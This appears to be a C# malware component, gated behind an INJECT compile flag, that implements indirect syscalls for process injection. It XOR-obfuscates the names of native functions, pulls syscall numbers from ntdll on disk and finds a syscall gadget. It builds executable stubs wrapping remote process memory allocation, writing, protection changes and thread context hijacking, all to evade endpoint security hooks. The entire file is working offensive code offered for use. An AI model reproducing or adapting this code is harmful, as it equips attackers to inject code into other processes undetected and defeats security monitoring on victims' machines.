#if INJECT
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    internal static class Syscall
    {
        private static volatile bool _initialized;
        private static IntPtr _stubBase;
        private static IntPtr _gadgetAddr;
        private static readonly object _initLock = new object();

        private const int StubSize = 22;

        // ── String decode ───────────────────────────────────────────
        private static readonly byte[] _xk = { 0x3E, 0xA7, 0x51, 0xC2, 0x89 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // Pre-computed encoded function names
        private static readonly byte[] _nd = { 0x50, 0xD3, 0x35, 0xAE, 0xE5, 0x10, 0xC3, 0x3D, 0xAE };
        private static readonly byte[] _f0 = { 0x70, 0xD3, 0x1E, 0xB2, 0xEC, 0x50, 0xF7, 0x23, 0xAD, 0xEA, 0x5B, 0xD4, 0x22 };
        private static readonly byte[] _f1 = { 0x70, 0xD3, 0x10, 0xAE, 0xE5, 0x51, 0xC4, 0x30, 0xB6, 0xEC, 0x68, 0xCE, 0x23, 0xB6, 0xFC, 0x5F, 0xCB, 0x1C, 0xA7, 0xE4, 0x51, 0xD5, 0x28 };
        private static readonly byte[] _f2 = { 0x70, 0xD3, 0x06, 0xB0, 0xE0, 0x4A, 0xC2, 0x07, 0xAB, 0xFB, 0x4A, 0xD2, 0x30, 0xAE, 0xC4, 0x5B, 0xCA, 0x3E, 0xB0, 0xF0 };
        private static readonly byte[] _f3 = { 0x70, 0xD3, 0x01, 0xB0, 0xE6, 0x4A, 0xC2, 0x32, 0xB6, 0xDF, 0x57, 0xD5, 0x25, 0xB7, 0xE8, 0x52, 0xEA, 0x34, 0xAF, 0xE6, 0x4C, 0xDE };
        private static readonly byte[] _f4 = { 0x70, 0xD3, 0x12, 0xAE, 0xE6, 0x4D, 0xC2 };
        private static readonly byte[] _f5 = { 0x70, 0xD3, 0x02, 0xB7, 0xFA, 0x4E, 0xC2, 0x3F, 0xA6, 0xDD, 0x56, 0xD5, 0x34, 0xA3, 0xED };
        private static readonly byte[] _f6 = { 0x70, 0xD3, 0x03, 0xA7, 0xFA, 0x4B, 0xCA, 0x34, 0x96, 0xE1, 0x4C, 0xC2, 0x30, 0xA6 };
        private static readonly byte[] _f7 = { 0x70, 0xD3, 0x16, 0xA7, 0xFD, 0x7D, 0xC8, 0x3F, 0xB6, 0xEC, 0x46, 0xD3, 0x05, 0xAA, 0xFB, 0x5B, 0xC6, 0x35 };
        private static readonly byte[] _f8 = { 0x70, 0xD3, 0x02, 0xA7, 0xFD, 0x7D, 0xC8, 0x3F, 0xB6, 0xEC, 0x46, 0xD3, 0x05, 0xAA, 0xFB, 0x5B, 0xC6, 0x35 };

        // Decoded target names for PE export matching
        private static string[] _targetNames;

        private static string[] TargetNames
        {
            get
            {
                if (_targetNames == null)
                {
                    _targetNames = new string[]
                    {
                        D(_f0), D(_f1), D(_f2), D(_f3), D(_f4),
                        D(_f5), D(_f6), D(_f7), D(_f8)
                    };
                }
                return _targetNames;
            }
        }

        // ── Delegate types ──────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtOpenProcess(
            out IntPtr ProcessHandle, uint DesiredAccess,
            IntPtr ObjectAttributes, IntPtr ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtAllocateVirtualMemory(
            IntPtr ProcessHandle, ref IntPtr BaseAddress,
            IntPtr ZeroBits, ref IntPtr RegionSize,
            uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtWriteVirtualMemory(
            IntPtr ProcessHandle, IntPtr BaseAddress,
            IntPtr Buffer, IntPtr NumberOfBytesToWrite,
            IntPtr NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtProtectVirtualMemory(
            IntPtr ProcessHandle, ref IntPtr BaseAddress,
            ref IntPtr RegionSize, uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtClose(IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtSuspendThread(
            IntPtr ThreadHandle, out uint PreviousSuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtResumeThread(
            IntPtr ThreadHandle, out uint PreviousSuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtGetContextThread(
            IntPtr ThreadHandle, IntPtr ThreadContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtSetContextThread(
            IntPtr ThreadHandle, IntPtr ThreadContext);

        // ── Cached delegate instances ───────────────────────────────

        private static DNtOpenProcess _ntOpenProcess;
        private static DNtAllocateVirtualMemory _ntAllocateVirtualMemory;
        private static DNtWriteVirtualMemory _ntWriteVirtualMemory;
        private static DNtProtectVirtualMemory _ntProtectVirtualMemory;
        private static DNtClose _ntClose;
        private static DNtSuspendThread _ntSuspendThread;
        private static DNtResumeThread _ntResumeThread;
        private static DNtGetContextThread _ntGetContextThread;
        private static DNtSetContextThread _ntSetContextThread;

        private static readonly ushort[] _ssns = new ushort[9];

        // ── Initialization ──────────────────────────────────────────

        public static bool Initialize()
        {
            if (_initialized) return true;

            lock (_initLock)
            {
                if (_initialized) return true;

                try
                {
                    string sysPath = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.System),
                        D(_nd));
                    byte[] peBytes = File.ReadAllBytes(sysPath);

                    if (!ExtractSSNs(peBytes))
                        return false;

                    _gadgetAddr = FindGadget();
                    if (_gadgetAddr == IntPtr.Zero)
                        return false;

                    int totalSize = StubSize * TargetNames.Length;
                    _stubBase = DynInvoke.VirtualAlloc(
                        IntPtr.Zero,
                        (UIntPtr)totalSize,
                        0x3000,
                        0x40);

                    if (_stubBase == IntPtr.Zero)
                        return false;

                    BuildAllStubs();

                    Array.Clear(peBytes, 0, peBytes.Length);

                    _initialized = true;
                    return true;
                }
                catch
                {
                    return false;
                }
            }
        }

        // ── PE Export Parsing ────────────────────────────────────────

        private struct SectionEntry
        {
            public uint VirtualAddress;
            public uint VirtualSize;
            public uint PointerToRawData;
        }

        private static bool ExtractSSNs(byte[] pe)
        {
            if (pe.Length < 0x40) return false;

            uint elf = BitConverter.ToUInt32(pe, 0x3C);
            if (elf + 4 > pe.Length) return false;

            if (pe[elf] != 'P' || pe[elf + 1] != 'E' ||
                pe[elf + 2] != 0 || pe[elf + 3] != 0)
                return false;

            uint coff = elf + 4;
            ushort numSections = BitConverter.ToUInt16(pe, (int)coff + 2);
            ushort optSize = BitConverter.ToUInt16(pe, (int)coff + 16);

            uint opt = coff + 20;
            if (BitConverter.ToUInt16(pe, (int)opt) != 0x020B)
                return false;

            uint exportRva = BitConverter.ToUInt32(pe, (int)opt + 112);
            if (exportRva == 0) return false;

            uint secOff = opt + optSize;
            var sections = new SectionEntry[numSections];
            for (int i = 0; i < numSections; i++)
            {
                uint s = secOff + (uint)(i * 40);
                sections[i] = new SectionEntry
                {
                    VirtualAddress = BitConverter.ToUInt32(pe, (int)s + 12),
                    VirtualSize = BitConverter.ToUInt32(pe, (int)s + 8),
                    PointerToRawData = BitConverter.ToUInt32(pe, (int)s + 20)
                };
            }

            uint expOff = RvaToFileOffset(exportRva, sections);
            if (expOff == 0) return false;

            uint numNames = BitConverter.ToUInt32(pe, (int)expOff + 24);
            uint addrFuncsRva = BitConverter.ToUInt32(pe, (int)expOff + 28);
            uint addrNamesRva = BitConverter.ToUInt32(pe, (int)expOff + 32);
            uint addrOrdsRva = BitConverter.ToUInt32(pe, (int)expOff + 36);

            uint funcsOff = RvaToFileOffset(addrFuncsRva, sections);
            uint namesOff = RvaToFileOffset(addrNamesRva, sections);
            uint ordsOff = RvaToFileOffset(addrOrdsRva, sections);

            string[] targets = TargetNames;
            for (int t = 0; t < targets.Length; t++)
            {
                bool found = false;
                for (uint i = 0; i < numNames && !found; i++)
                {
                    uint nameRva = BitConverter.ToUInt32(pe, (int)(namesOff + i * 4));
                    uint nameFileOff = RvaToFileOffset(nameRva, sections);

                    if (MatchName(pe, nameFileOff, targets[t]))
                    {
                        ushort ordinal = BitConverter.ToUInt16(pe, (int)(ordsOff + i * 2));
                        uint funcRva = BitConverter.ToUInt32(pe, (int)(funcsOff + ordinal * 4));
                        uint funcOff = RvaToFileOffset(funcRva, sections);

                        if (funcOff + 8 <= pe.Length &&
                            pe[funcOff + 0] == 0x4C &&
                            pe[funcOff + 1] == 0x8B &&
                            pe[funcOff + 2] == 0xD1 &&
                            pe[funcOff + 3] == 0xB8)
                        {
                            _ssns[t] = BitConverter.ToUInt16(pe, (int)(funcOff + 4));
                            found = true;
                        }
                    }
                }
                if (!found) return false;
            }
            return true;
        }

        private static uint RvaToFileOffset(uint rva, SectionEntry[] sections)
        {
            for (int i = 0; i < sections.Length; i++)
            {
                if (rva >= sections[i].VirtualAddress &&
                    rva < sections[i].VirtualAddress + sections[i].VirtualSize)
                {
                    return sections[i].PointerToRawData +
                           (rva - sections[i].VirtualAddress);
                }
            }
            return 0;
        }

        private static bool MatchName(byte[] pe, uint offset, string target)
        {
            for (int i = 0; i < target.Length; i++)
            {
                if (offset + i >= pe.Length) return false;
                if (pe[offset + i] != (byte)target[i]) return false;
            }
            return (offset + target.Length < pe.Length &&
                    pe[offset + target.Length] == 0);
        }

        // ── Gadget Search ───────────────────────────────────────────

        private static IntPtr FindGadget()
        {
            IntPtr hMod = DynInvoke.LoadLib(D(_nd));
            if (hMod == IntPtr.Zero) return IntPtr.Zero;

            int elf = Marshal.ReadInt32(hMod + 0x3C);
            short numSec = Marshal.ReadInt16(hMod + elf + 6);
            short optSize = Marshal.ReadInt16(hMod + elf + 20 + 16);
            int secStart = elf + 4 + 20 + optSize;

            for (int i = 0; i < numSec; i++)
            {
                IntPtr sh = hMod + secStart + (i * 40);

                if (Marshal.ReadByte(sh + 0) == (byte)'.' &&
                    Marshal.ReadByte(sh + 1) == (byte)'t' &&
                    Marshal.ReadByte(sh + 2) == (byte)'e' &&
                    Marshal.ReadByte(sh + 3) == (byte)'x' &&
                    Marshal.ReadByte(sh + 4) == (byte)'t')
                {
                    int vSize = Marshal.ReadInt32(sh + 8);
                    int vAddr = Marshal.ReadInt32(sh + 12);
                    IntPtr scan = hMod + vAddr;

                    for (int j = 0; j < vSize - 2; j++)
                    {
                        if (Marshal.ReadByte(scan + j) == 0x0F &&
                            Marshal.ReadByte(scan + j + 1) == 0x05 &&
                            Marshal.ReadByte(scan + j + 2) == 0xC3)
                        {
                            return scan + j;
                        }
                    }
                }
            }
            return IntPtr.Zero;
        }

        // ── Stub Construction ───────────────────────────────────────

        private static void BuildAllStubs()
        {
            int offset = 0;
            _ntOpenProcess = (DNtOpenProcess)BuildStub(ref offset, _ssns[0], typeof(DNtOpenProcess));
            _ntAllocateVirtualMemory = (DNtAllocateVirtualMemory)BuildStub(ref offset, _ssns[1], typeof(DNtAllocateVirtualMemory));
            _ntWriteVirtualMemory = (DNtWriteVirtualMemory)BuildStub(ref offset, _ssns[2], typeof(DNtWriteVirtualMemory));
            _ntProtectVirtualMemory = (DNtProtectVirtualMemory)BuildStub(ref offset, _ssns[3], typeof(DNtProtectVirtualMemory));
            _ntClose = (DNtClose)BuildStub(ref offset, _ssns[4], typeof(DNtClose));
            _ntSuspendThread = (DNtSuspendThread)BuildStub(ref offset, _ssns[5], typeof(DNtSuspendThread));
            _ntResumeThread = (DNtResumeThread)BuildStub(ref offset, _ssns[6], typeof(DNtResumeThread));
            _ntGetContextThread = (DNtGetContextThread)BuildStub(ref offset, _ssns[7], typeof(DNtGetContextThread));
            _ntSetContextThread = (DNtSetContextThread)BuildStub(ref offset, _ssns[8], typeof(DNtSetContextThread));
        }

        private static Delegate BuildStub(ref int offset, ushort ssn, Type delegateType)
        {
            IntPtr addr = IntPtr.Add(_stubBase, offset);
            byte[] stub = new byte[StubSize];

            stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;

            stub[3] = 0xB8;
            BitConverter.GetBytes((uint)ssn).CopyTo(stub, 4);

            stub[8] = 0xFF; stub[9] = 0x25;
            stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;

            BitConverter.GetBytes(_gadgetAddr.ToInt64()).CopyTo(stub, 14);

            Marshal.Copy(stub, 0, addr, StubSize);
            offset += StubSize;

            return Marshal.GetDelegateForFunctionPointer(addr, delegateType);
        }

        // ── Public Wrappers ─────────────────────────────────────────

        public static int NtOpenProcess(out IntPtr processHandle,
                                         uint desiredAccess, int processId)
        {
            IntPtr pOA = Marshal.AllocHGlobal(48);
            ZeroMemory(pOA, 48);
            Marshal.WriteInt32(pOA, 48);

            IntPtr pCID = Marshal.AllocHGlobal(16);
            Marshal.WriteIntPtr(pCID, (IntPtr)processId);
            Marshal.WriteIntPtr(pCID, 8, IntPtr.Zero);

            try
            {
                return _ntOpenProcess(out processHandle, desiredAccess, pOA, pCID);
            }
            finally
            {
                Marshal.FreeHGlobal(pCID);
                Marshal.FreeHGlobal(pOA);
            }
        }

        public static int NtAllocateVirtualMemory(IntPtr processHandle,
            ref IntPtr baseAddress, ref IntPtr regionSize,
            uint allocationType, uint protect)
        {
            return _ntAllocateVirtualMemory(processHandle,
                ref baseAddress, IntPtr.Zero, ref regionSize,
                allocationType, protect);
        }

        public static int NtWriteVirtualMemory(IntPtr processHandle,
            IntPtr baseAddress, byte[] buffer)
        {
            var pin = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            try
            {
                return _ntWriteVirtualMemory(processHandle, baseAddress,
                    pin.AddrOfPinnedObject(), (IntPtr)buffer.Length, IntPtr.Zero);
            }
            finally
            {
                pin.Free();
            }
        }

        public static int NtProtectVirtualMemory(IntPtr processHandle,
            ref IntPtr baseAddress, ref IntPtr regionSize,
            uint newProtect, out uint oldProtect)
        {
            return _ntProtectVirtualMemory(processHandle,
                ref baseAddress, ref regionSize, newProtect, out oldProtect);
        }

        public static int NtClose(IntPtr handle)
        {
            return _ntClose(handle);
        }

        public static int NtSuspendThread(IntPtr threadHandle)
        {
            uint dummy;
            return _ntSuspendThread(threadHandle, out dummy);
        }

        public static int NtResumeThread(IntPtr threadHandle)
        {
            uint dummy;
            return _ntResumeThread(threadHandle, out dummy);
        }

        public static int NtGetContextThread(IntPtr threadHandle, IntPtr pContext)
        {
            return _ntGetContextThread(threadHandle, pContext);
        }

        public static int NtSetContextThread(IntPtr threadHandle, IntPtr pContext)
        {
            return _ntSetContextThread(threadHandle, pContext);
        }

        private static void ZeroMemory(IntPtr ptr, int size)
        {
            for (int i = 0; i < size; i++)
                Marshal.WriteByte(ptr, i, 0);
        }
    }
}
#endif
